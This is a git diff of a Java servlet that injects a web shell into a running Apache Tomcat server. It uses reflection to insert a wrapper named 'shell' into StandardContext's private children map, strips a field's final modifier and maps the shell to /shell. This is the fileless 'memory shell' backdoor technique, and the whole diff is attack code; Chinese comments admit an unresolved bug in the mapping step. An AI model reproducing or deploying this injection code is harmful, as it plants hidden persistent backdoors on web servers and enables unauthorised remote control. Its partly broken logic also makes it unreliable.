@@ -1,9 +1,11 @@
 package cn.safe6.servlet;
 
+import org.apache.catalina.Container;
 import org.apache.catalina.Wrapper;
 import org.apache.catalina.core.ApplicationContext;
 import org.apache.catalina.core.StandardContext;
 import org.apache.catalina.core.StandardWrapper;
+
 import javax.servlet.ServletContext;
 import javax.servlet.ServletException;
 import javax.servlet.annotation.WebServlet;
@@ -12,9 +14,11 @@ import javax.servlet.http.HttpServletRequest;
 import javax.servlet.http.HttpServletResponse;
 import java.io.IOException;
 import java.lang.reflect.Field;
+import java.lang.reflect.Modifier;
+import java.util.HashMap;
 
-@WebServlet("/add")
-public class AddShellServlet extends HttpServlet {
+@WebServlet("/add1")
+public class AddShellServlet1 extends HttpServlet {
 
     @Override
     protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
@@ -45,13 +49,30 @@ public class AddShellServlet extends HttpServlet {
             //设置servlet全限定名，可以不设置
             wrapper.setServletClass(shell.getClass().getName());
 
-            //添加到标准上下文
-            standardContext.addChild(wrapper);
+            //添加到标准上下文,不用addChild方法，用反射实现
+            //standardContext.addChild(wrapper);
+            Class staCtx = standardContext.getClass();
 
-            //添加映射关系
+            //获取父类定义的字段，虽然有继承，但是没卵用。如过
+            Class staCtxSp = staCtx.getSuperclass();
+
+            Field childrenField = staCtxSp.getDeclaredField("children");
+            childrenField.setAccessible(true);
+            HashMap<String, Container> children = (HashMap<String, Container>)childrenField.get(standardContext);
+            children.put("shell",wrapper);
+            //改modifiers
+            Field modifiers = childrenField.getClass().getDeclaredField("modifiers");
+            modifiers.setAccessible(true);
+            modifiers.setInt(childrenField,childrenField.getModifiers() & ~Modifier.FINAL);
+            //设置值
+            childrenField.set(standardContext,children);
+
+
+            //添加映射关系,不用addServletMappingDecoded方法，用反射实现
+            //TODO 有bug，后面研究
             standardContext.addServletMappingDecoded("/shell","shell");
-
             resp.getWriter().write("add success!");
+
         } catch (Exception e) {
             e.printStackTrace();
         }
